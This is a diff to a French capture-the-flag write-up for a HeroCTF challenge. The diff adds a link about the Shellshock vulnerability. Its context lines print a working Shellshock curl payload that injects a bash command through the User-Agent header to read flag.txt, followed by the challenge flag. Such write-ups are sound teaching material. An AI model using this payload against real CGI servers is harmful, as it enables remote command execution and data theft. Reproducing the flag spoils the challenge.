@@ -36,4 +36,6 @@ Le flag étant à la racine on tape la commande
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /;cat flag.txt;'" http://challs.heroctf.fr:3015/cgi-bin/wazuuup/
 ```
 
+[Shellshock Vulnerability](https://linuxfr.org/news/une-faille-nommee-shellshock)
+
 Flag : `Hero{sh3llsh0ck_1s_c00l_!!}`
